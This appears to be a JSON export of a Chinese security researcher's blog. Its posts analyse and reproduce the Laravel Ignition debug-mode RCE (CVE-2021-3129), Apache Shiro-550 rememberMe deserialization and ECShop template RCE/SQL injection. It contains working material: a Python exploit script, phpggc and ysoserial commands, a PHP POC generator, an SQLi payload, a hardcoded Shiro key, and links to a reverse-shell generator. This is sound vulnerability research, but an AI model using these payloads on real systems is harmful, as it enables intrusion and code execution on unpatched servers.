{"pages":[{"title":"","text":"CUIT 在读 Wechat: U2VjLU1pbgo== D0g3 道格安全研究实验室成员","link":"/about/index.html"},{"title":"分类 ~","text":"","link":"/categories/index.html"},{"title":"友情链接","text":"D0g3 team P1g3: http://payloads.info/ Threezh1: https://threezh1.com/ Loong716: https://loong716.top/ More D0g3er: https://www.d0g3.cn/about 其他小伙伴 离怀秋: https://lihuaiqiu.github.io/ Decade: https://wulidecade.cn/","link":"/link/index.html"},{"title":"","text":"Reverse Shell：https://weibell.github.io/reverse-shell-generator/ LOLBAS：https://lolbas-project.github.io/ java.lang.Runtime.exec() Payload Workarounds：http://jackson-t.ca/runtime-exec-payloads.html","link":"/note/index.html"},{"title":"标签 ~","text":"","link":"/tags/index.html"},{"title":"search","text":"","link":"/search/index.html"}],"posts":[{"title":"Laravel <= v8.4.2 debug mode RCE 漏洞分析","text":"CVE-2021-3129，利用思路非常有意思，值得记录和学习 漏洞分析报错情况这个漏洞是基于 Ignition &lt;= 2.5.1，Ignition 是 Laravel 6 版本之后的默认错误页面生成器 In addition to displaying beautiful stack traces, Ignition comes with solutions, small snippets of code that solve problems that you might encounter while developping your application. For instance, this is what happens if we use an unknown variable in a template: 抓到 Make variable optional 的包 流程分析上图可以看到请求的相关信息，可以根据路由定位一下相关代码 vendor/facade/ignition/src/IgnitionServiceProvider.php \\Facade\\Ignition\\IgnitionServiceProvider::registerHousekeepingRoutes Route::post(&apos;execute-solution&apos;, ExecuteSolutionController::class) -&gt;middleware(IgnitionConfigValueEnabled::class.&apos;:enableRunnableSolutions&apos;) -&gt;name(&apos;executeSolution&apos;); 这里会触发 ExecuteSolutionController 的 invoke \\Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController 会调用获取 solution 对象的 run 方法 public function __invoke( ExecuteSolutionRequest $request, SolutionProviderRepository $solutionProviderRepository) { $solution = $request-&gt;getRunnableSolution(); $solution-&gt;run($request-&gt;get(&apos;parameters&apos;, [])); return response(&apos;&apos;);} 后续还有更深的调用栈，这里就不展开分析 ExecuteSolutionController-&gt;__invoke()-&gt;ExecuteSolutionRequest-&gt;getRunnableSolution()-&gt;getSolution()-&gt;MakeViewVariableOptionalSolution-&gt;run() 最后漏洞的触发点在 file_get_contents public function run(array $parameters = []) { $output = $this-&gt;makeOptional($parameters); if ($output !== false) { file_put_contents($parameters[&apos;viewFile&apos;], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters[&apos;viewFile&apos;]); $newContents = str_replace(&apos;$&apos;.$parameters[&apos;variableName&apos;], &apos;$&apos;.$parameters[&apos;variableName&apos;].&quot; ?? &apos;&apos;&quot;, $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&apos;variableName&apos;]); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } The only input variable left is viewFile. If we make abstraction of variableName and all of its uses, we end up with the following code snippet: $contents = file_get_contents($parameters[&apos;viewFile&apos;]);file_put_contents($parameters[&apos;viewFile&apos;], $contents); 漏洞复现目前看到大概两个漏洞利用的方式 Phar 反序列化 Talking to PHP-FPM using FTP Phar 反序列化两种思路： phar 文件直接触发（需要上传点） log文件转换为 phar 文件（不需要上传点） 两种思路都是打的 laravel 的依赖的反序列化链 直接触发如果能直接上传一个 phar文件的话可以直接触发 ./phpggc monolog/rce1 system whoami --phar phar -o ./monolog1.gif 转换触发 默认情况下，包含每个PHP错误和堆栈跟踪的Laravel日志文件存储在中storage/log/laravel.log 漏洞利用的核心思路是将 log 文件转换成 phar 文件，从而触发 phar 反序列化 清空 log 文件viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log 核心思路是：php://filter中的convert.base64-decode过滤器的特性为转换base64时会将不是base64的字符清空 PS： 需要连续的两次返回为 200 的 status 才能完全清空 log 给log添加一条前缀viewFile: AA 写入 phar 数据进 log 文件php -d&apos;phar.readonly=0&apos; ./phpggc monolog/rce1 system whoami --phar phar -o php://output | base64 -w0 再用 python 进行转换 import base64s = [PAYLOAD]&apos;&apos;.join([&quot;=&quot; + hex(ord(i))[2:] + &quot;=00&quot; for i in s]).upper() 将编码后的字符直接写进文件 viewFile: [PAYLOAD] 触发 Phar 反序列化先将文件内容解码成只有 Phar 的文件 viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log 最后用伪协议触发 Phar 反序列化 viewFile: phar:///Applications/MAMP/htdocs/laravel/storage/logs/laravel.log/test.txt 大坑MAMP 神仙环境，最后将文件内容解码的时候无法解压成 phar 格式内容 最后一步过滤文件内容的时候在环境上打过去一直 500 重写了一个代码复现的 &lt;?php$contents = file_get_contents(&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;);file_put_contents(&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;, $contents);?&gt; final POC https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py import requestsurl = &quot;http://laravel:80/index.php/_ignition/execute-solution&quot;headers = { &quot;Accept&quot;: &quot;application/json&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;}vul_json = { &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: { &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;&quot; }}def clearLog(): global url, headers, vul_json vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot; while True: res1 = requests.post(url, headers=headers, json=vul_json, verify=False) if res1 and res1.status_code == 200: res2 = requests.post(url, headers=headers, json=vul_json, verify=False) if res2 and res2.status_code == 200: print(&quot;clear&quot;) breakdef getphar(): global url, headers, vul_json # while True: clearLog() vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;AA&quot; res1 = requests.post(url, headers=headers, json=vul_json, verify=False) if &apos;file_get_contents(AA)&apos; in res1.text: vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00&quot; res2 = requests.post(url, headers=headers, json=vul_json, verify=False) if &apos;file_get_contents(&apos; in res2.text: vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot; res3 = requests.post(url, headers=headers, json=vul_json, verify=False) if res3 and res3.status_code == 200: print(&quot;phar write&quot;)if __name__ == &quot;__main__&quot;: getphar() 后来跟 @lihuaiqiu 和 @decade 交流 MAMP 环境失败的原因，发现是 MAMP 没有相关的扩展 Talking to PHP-FPM using FTP思路很不错，可以看这两篇文章 https://www.anquanke.com/post/id/226750#h2-0 https://security.immomo.com/blog/15 本地复现的时候弹不了shell回来 REF https://zhuanlan.zhihu.com/p/344568679 https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g","link":"/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"360网络安全职业认证 - CSSJ","text":"学校这边政策是大二之前可以免费考试。含金量未知，留个纪念。","link":"/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/"},{"title":"Shiro-550 rememberMe 反序列化漏洞分析","text":"本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习 漏洞详情https://issues.apache.org/jira/browse/SHIRO-550 Affects Version/s:1.2.4 漏洞复现Check 采用空对象 Attack: ysoserial POC java -jar ysoserial.jar CommonsCollections2 &quot;open -a calculator&quot;|base64 |sed &apos;:label;N;s/\\n//;b label&apos; Exploit 漏洞分析Shiro 1.2.4及以下版本下默认 cookie 中 rememberMe 字段的生成过程 序列化恶意对象（payload） 对序列化的数据进行AES加密 将加密后的数据进行base64编码 发送 rememberMe cookie 因此对应服务端的反序列化逻辑推测应该是： 接受 rememberMe cookie -&gt; base64 解码 -&gt; AES 解密 -&gt; 触发反序列化 所以分析的重点就在 rememberMe 的生成和 服务端反序列化这里 加密流程在一个正常的登录过程中，开启 Remember Me 时。若成功登录会触发 AbstractRememberMeManager#onSuccessfulLogin 分析入口点 AbstractRememberMeManager#onSuccessfulLogin public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) { this.forgetIdentity(subject); if (this.isRememberMe(token)) { this.rememberIdentity(subject, token, info); } else if (log.isDebugEnabled()) { log.debug(&quot;AuthenticationToken did not indicate RememberMe is requested. RememberMe functionality will not be executed for corresponding account.&quot;); }} 关键点1: org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 和 org.apache.shiro.mgt.AbstractRememberMeManager#isRememberMe 判断是否启用了 Remember Me 功能 principals 对象在 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity 创建 principals 的值 关键点2：序列化、加密对象 依次看一下序列化这一步的步骤 // org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytesprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { byte[] bytes = this.serialize(principals);// org.apache.shiro.mgt.AbstractRememberMeManager.serializeprotected byte[] serialize(PrincipalCollection principals) { return this.getSerializer().serialize(principals);}// org.apache.shiro.io.DefaultSerializer#serializepublic byte[] serialize(T o) throws SerializationException { if (o == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayOutputStream baos = new ByteArrayOutputStream(); BufferedOutputStream bos = new BufferedOutputStream(baos); try { ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(o); oos.close(); return baos.toByteArray(); } catch (IOException var6) { String msg = &quot;Unable to serialize object [&quot; + o + &quot;]. &quot; + &quot;In order for the DefaultSerializer to serialize this object, the [&quot; + o.getClass().getName() + &quot;] &quot; + &quot;class must implement java.io.Serializable.&quot;; throw new SerializationException(msg, var6); } }}// org.apache.shiro.subject.SimplePrincipalCollection#writeObjectprivate void writeObject(ObjectOutputStream out) throws IOException { out.defaultWriteObject(); boolean principalsExist = !CollectionUtils.isEmpty(this.realmPrincipals); out.writeBoolean(principalsExist); if (principalsExist) { out.writeObject(this.realmPrincipals); }} 最后是在 org.apache.shiro.io.DefaultSerializer#serialize 的 toByteArray 返回的字节码 再依次看一下加密这一步的步骤 在看这个之前需要先看当前类的构造方法 设置 AES 的各个信息 org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService 进入加密步骤 第一部分 // org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytesprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { if (this.getCipherService() != null) { bytes = this.encrypt(bytes); }}/** org.apache.shiro.mgt.AbstractRememberMeManager#encrypt* 后面先进入 this.getCipherService(); 的分析*/protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = this.getCipherService(); return value;}// org.apache.shiro.mgt.AbstractRememberMeManager#getCipherServicepublic CipherService getCipherService() { return this.cipherService;}/* * org.apache.shiro.mgt.AbstractRememberMeManager * 这个是在该类调用构造方法初始化的时候就附值的*/public abstract class AbstractRememberMeManager implements RememberMeManager { private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); private CipherService cipherService = new AesCipherService();// org.apache.shiro.crypto.AesCipherServicepublic class AesCipherService extends DefaultBlockCipherService { private static final String ALGORITHM_NAME = &quot;AES&quot;; public AesCipherService() { super(&quot;AES&quot;); }}// org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherServicepublic DefaultBlockCipherService(String algorithmName) { super(algorithmName); this.modeName = OperationMode.CBC.name(); this.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.blockSize = 0; this.streamingModeName = OperationMode.CBC.name(); this.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.streamingBlockSize = 8;}/** org.apache.shiro.mgt.AbstractRememberMeManager#encrypt* 运行刚刚这个类的后半部分* 这里 cipherService 确定了加密类型等*/protected byte[] encrypt(byte[] serialized) { if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey()); value = byteSource.getBytes(); } return value;} 这里先看 getEncryptionCipherKey 方法的调用 /** org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey* 这里的 this.encryptionCipherKey 是之前类初始化的时候就定义的*/public byte[] getEncryptionCipherKey() { return this.encryptionCipherKey;}/** 回顾类的初始化* org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager* 注意 DEFAULT_CIPHER_KEY_BYTES，其实是之前 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); 已经硬编码好的。 这是漏洞的根源*/public AbstractRememberMeManager() { this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);}// org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKeypublic void setCipherKey(byte[] cipherKey) { this.setEncryptionCipherKey(cipherKey); this.setDecryptionCipherKey(cipherKey);}// org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKeypublic void setEncryptionCipherKey(byte[] encryptionCipherKey) { this.encryptionCipherKey = encryptionCipherKey;} 第二部分 然后是 encrypt 方法 （核心 AES 加密） 传入的两个参数一个是刚刚在 org.apache.shiro.io.DefaultSerializer#serialize 的 toByteArray 返回的字节码。另一个就是 AES KEY 后面的就是 AES 加密的过程， 最后会返回一个 bytes 第三部分 /** 返回 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity* bytes 返回两个参数经过 encrypt 加密的值*/protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) { byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals); this.rememberSerializedIdentity(subject, bytes);}/** org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity* base64 加密* 设置 cookie */protected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { ······ } else { HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); String base64 = Base64.encodeToString(serialized); Cookie template = this.getCookie(); Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); }} 完成了 序列化对象 -&gt; AES 加密 -&gt; Base64 加密 -&gt; 设置 cookie 值 的过程 解密流程POC 生成：https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py 从 POC 的触发来看解密流程 // org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentityprotected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) { RememberMeManager rmm = this.getRememberMeManager(); if (rmm != null) { try { return rmm.getRememberedPrincipals(subjectContext); ···/** 上面 return 调用 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals*/public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = this.getRememberedSerializedIdentity(subjectContext);/** 上面调用 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity*/protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { ··· String base64 = this.getCookie().readValue(request, response);/** 上面调用 org.apache.shiro.web.servlet.SimpleCookie#readValue* 关键函数 readValue 返回 rememberMe 的 POC 值*/public String readValue(HttpServletRequest request, HttpServletResponse ignored) { // 获取到了传入的 cookie 的名字 name: &quot;rememberMe&quot; String name = this.getName(); String value = null; // 这里获取到 rememberMe 对应的值 javax.servlet.http.Cookie cookie = getCookie(request, name); if (cookie != null) { value = cookie.getValue(); log.debug(&quot;Found &apos;{}&apos; cookie value [{}]&quot;, name, value); } else { log.trace(&quot;No &apos;{}&apos; cookie value&quot;, name); } // 返回 rememberMe 的值 return value;}/** 跳回 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity* 关键点：会进行base64解码*/protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { ··· if (&quot;deleteMe&quot;.equals(base64)) { return null; } else if (base64 != null) { // 确实是否是base64 base64 = this.ensurePadding(base64); ··· byte[] decoded = Base64.decode(base64); ··· return decoded; } else { return null; } } }}/** 跳回 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals* 此时已经将 base64 进行了解码*/public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { ··· principals = this.convertBytesToPrincipals(bytes, subjectContext);/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals*/protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (this.getCipherService() != null) { bytes = this.decrypt(bytes); }/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt* 关键点： 进行 AES 解密， 并返回解密值*/protected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized;}/** 返回 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals* 此处调用 deserialize*/protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { ··· return this.deserialize(bytes);}/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#deserialize*/protected PrincipalCollection deserialize(byte[] serializedIdentity) { return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);}/** 调用 org.apache.shiro.io.DefaultSerializer#deserialize* 最终关键点：进行反序列化*/public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = &quot;Unable to deserialze argument byte array.&quot;; throw new SerializationException(msg, var6); } }}} 以下是几个关键点截图： 漏洞修复https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848 硬编码 -&gt; 随机值 利用限制、坑点及思考为什么 100key 能用各种 shiro exploit 似乎都在集成一个爆破 key 的功能。但是根据漏洞可以看出 1.2.4 的 key 是硬编码的，然后 1.2.5 之后变成了随机值。key 值爆破似乎跟两个版本没有什么关系。 对 shiro 的了解和研究并不深刻，这个问题的答案来源于：关于Shiro反序列化漏洞的延伸—升级shiro也能被shell 可能性1：有其他开源框架整合了shiro，并且有这样一段配置文件，大家就都直接用了。 可能性2：因为这种代码都是互相抄来抄去的，在博客里，教程里，github里有这个代码，开发直接拿过来用。 Forexampe: ShiroConfig /** * cookie管理对象 * @return */public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememberMeCookie()); // rememberMe cookie加密的密钥 cookieRememberMeManager.setCipherKey(Base64.decode(&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;)); return cookieRememberMeManager;} 为什么有的链打不了这个在身边的 @p1g3 和 @l3yx 的博客中都阐述的很详细了。 简而言之就是 org.apache.shiro.io.DefaultSerializer#deserialize 中调用 的 ClassResolvingObjectInputStream 重写了 resolveClass public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = &quot;Unable to deserialze argument byte array.&quot;; throw new SerializationException(msg, var6); } }}} 看一下 org.apache.shiro.io.ClassResolvingObjectInputStream 是怎么写的 //// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.shiro.io;import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import org.apache.shiro.util.ClassUtils;import org.apache.shiro.util.UnknownClassException;public class ClassResolvingObjectInputStream extends ObjectInputStream { public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException var3) { throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, var3); } }} Compare to java.io.ObjectInputStream#resolveClass public Class&lt;?&gt; resolveClass(ObjectStreamClass objectStreamClass) throws IOException, ClassNotFoundException { String name = objectStreamClass.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException e) { ClassNotFoundException classNotFoundException = e; Class&lt;?&gt; cls = primClasses.get(name); if (cls != null) { return cls; } throw classNotFoundException; }} Shiro 中使用了 ClassUtils.forName 而原生的使用的 Class.forName 具体区别跟进 ClassUtils.forName public static Class forName(String fqcn) throws UnknownClassException { Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn); if (clazz == null) { if (log.isTraceEnabled()) { log.trace(&quot;Unable to load class named [&quot; + fqcn + &quot;] from the thread context ClassLoader. Trying the current ClassLoader...&quot;); } clazz = CLASS_CL_ACCESSOR.loadClass(fqcn); } if (clazz == null) { if (log.isTraceEnabled()) { log.trace(&quot;Unable to load class named [&quot; + fqcn + &quot;] from the current ClassLoader. &quot; + &quot;Trying the system/application ClassLoader...&quot;); } clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn); } if (clazz == null) { String msg = &quot;Unable to load class named [&quot; + fqcn + &quot;] from the thread context, current, or &quot; + &quot;system/application ClassLoaders. All heuristics have been exhausted. Class could not be found.&quot;; throw new UnknownClassException(msg); } else { return clazz; }} 直观可以看到的是里面大多采用了 loadClass 来加载。至于使用其加载类有什么弊端可以看 @p1g3 这段话 ClassLoader.loadClass的方式并不支持加载数组类，这也是为什么cc没法用的原因，当然这部分我并没有深入分析，因为其涉及到了Java中一种叫”双亲委派”的类加载思路 &amp; 突破”双亲委派”的思路，这部分和漏洞无关 此时我们则无法使用任何带数组对象的gadget，而cc3.2.1中的所有链（在官方仓库内的）都需要用到数组对象transformer，所以需要重新构造链，用其他链来打。 大概小结： Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。 至于 ClassLoader.loadClass 是不是所有 class 都无法加载？ 参考下一小标题 延伸 - resovleClass 的数组类加载在 P牛圈子中有个师傅文章 看到了这一点，对于上一个小标题中总结的 ClassLoader.loadClass不支持装载数组类型的class 有了全新的看法。 [Ljava.lang.StackTraceElement 数组类加载 先留个坑，CC调完回来写 JRMP 攻击 优点 不需要依赖 缺点 JEP290（受限 JDK 版本）: https://paper.seebug.org/454/ 需要出网 分析思考匆匆分析完了 Shiro550。除了加解密流程跟 POC 的编写外似乎并没有分析太多东西。由于对 AES 的理解不足直接在加解密过程中直接忽略了 AES 的具体步骤。感觉这样浅尝辄止的分析不是太好。因此在下一次分析的时候要具体细化一下。 前文中提到了 resovleClass 对 Shiro 利用链的限制，那么什么链可以使用，该如何去构造新的链，是我们值得深思的问题。先留个坑，准备去理一下 CommonsCollections gadget chain Shiro-721 PaddingOracle CBC AttackShiro-721 PaddingOracle CBC Attack 个人总结漏洞原理以下几点： rememberMe 加解密原理 Shiro 1.4.1及其之前版本的Cookie中的rememberMe字段是使用AES-128-CBC模式来加密生成的 限制： Apache Shiro &lt;= 1.4.1 需要有正常用户登录的 Cookie rememberMe 涉及到密码算法，且实际利用有限。不在本文分析范围 Referencehttps://l3yx.github.io/ https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/","link":"/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"ECShop 3.6.x RCE 漏洞分析","text":"两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习 近日笔者又看到了 4.0 版本的 SQL 注入漏洞分析，一个 nday 到 0day 挖掘的利用思路。本想连着一起复现分析，可是没有找到 4.0的安装包 3.6.x RCE漏洞复现Vulhub上已经有现成的利用脚本 &lt;?php$shell = bin2hex(&quot;{\\$asd&apos;];phpinfo\\t();//}xxx&quot;);$id = &quot;-1&apos; UNION/*&quot;;$arr = [ &quot;num&quot; =&gt; sprintf(&apos;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&apos;, bin2hex($id), $shell), &quot;id&quot; =&gt; $id];$s = serialize($arr);$hash3 = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;;$hash2 = &apos;554fcae493e564ee0dc75bdf2ebf94ca&apos;;echo &quot;POC for ECShop 2.x: \\n&quot;;echo &quot;{$hash2}ads|{$s}{$hash2}&quot;;echo &quot;\\n\\nPOC for ECShop 3.x: \\n&quot;;echo &quot;{$hash3}ads|{$s}{$hash3}&quot;; 漏洞分析触发流程定位触发点 /user.php： 对 $back_act 附值， 其实这个地方相当于 Referer 字段不包含 user.php 的前提下能达到 $back_act 的变量可控 变量传递 跟进，这里进行了变量注册。将 $back_act 注册成了 $this-&gt;_var[$tpl_var] 下面跟进 display ，/includes/cls_template.php 为模版类， display 为页面显示函数 跟进 fetch，主要为模版处理文件。处理的 filename 为 user_passport.dwt 其中这里会触发编译模版函数 跟进make_compiled , 会返回处理好的 hmtl 内容。然后附值给 out 之后会返回 display 函数继续处理未处理的流程，strpos 判断这里是至关重要的一点，涉及到了之后需要调用的 insert_mod 。 $this-&gt;_echash 是之前 /includes/cls_template.php 定义好的 var $_echash = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;; 然后进行 foreach 循环执行 insert_mod 这里 if (($key % 2) == 1) 的作用看一下被切割的 k 就知道了 跟进 insert_mod， 主要完成这几件事儿： 用 | 分割变量 反序列化 para fun 变量的拼接 返回 $fun($para) 根据返回值引发思考， 我们目前得到的返回值是：$fun($para) $fun($para) 的 fun 来自 insert_ + 被 explode 的前半部分 para 来自被 explode 的后半部分 那么漏洞利用思路就是执行拼接了 insert_ 的可控函数 问题剖析 问题一 首先是 $back_act 附值方式，为什么采用 Referer 头传入？ 其实还有很多其他附值方法： emample:$back_act = isset($_POST[&apos;back_act&apos;]) ? trim($_POST[&apos;back_act&apos;]) : &apos;&apos;; 究其核心原因： /includes/init.php addslashes_deep 问题二 为什么字符串是序列化字符串？ /includes/cls_template.php#insert_mod 先分割，再反序列化 问题三 如何bypass 主要过滤 function smarty_prefilter_preCompile($source){ ··· $pattern = array( &apos;/&lt;!--[^&gt;|\\n]*?({.+?})[^&lt;|{|\\n]*?--&gt;/&apos;, // 替换smarty注释 &apos;/&lt;!--[^&lt;|&gt;|{|\\n]*?--&gt;/&apos;, // 替换不换行的html注释 &apos;/(href=[&quot;|\\&apos;])\\.\\.\\/(.*?)([&quot;|\\&apos;])/i&apos;, // 替换相对链接 &apos;/((?:background|src)\\s*=\\s*[&quot;|\\&apos;])(?:\\.\\/|\\.\\.\\/)?(images\\/.*?[&quot;|\\&apos;])/is&apos;, // 在images前加上 $tmp_dir &apos;/((?:background|background-image):\\s*?url\\()(?:\\.\\/|\\.\\.\\/)?(images\\/)/is&apos;, // 在images前加上 $tmp_dir &apos;/([\\&apos;|&quot;])\\.\\.\\//is&apos;, // 以../开头的路径全部修正为空 ); $replace = array( &apos;\\1&apos;, &apos;&apos;, &apos;\\1\\2\\3&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; ); return preg_replace($pattern, $replace, $source); } SQLi（云复现）3.x版本引入了 /includes/safety.php 进行过滤。所以 3.x 版本 理论上是不存在 SQL 注入的 但是为了学习思路，还是云复现一下这个 2.x 版本可以利用的漏洞。 之前分析到寻找可控函数进行调用。网上用的都是 insert_ads 这个函数 关于 SQL 注入的利用思考可以参考这篇文章：https://xz.aliyun.com/t/2725 注释掉了 waf 相关的函数（绕不过去），payload 如下 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:57:&quot;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&quot;;} 执行的相应 SQL 语句： SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, 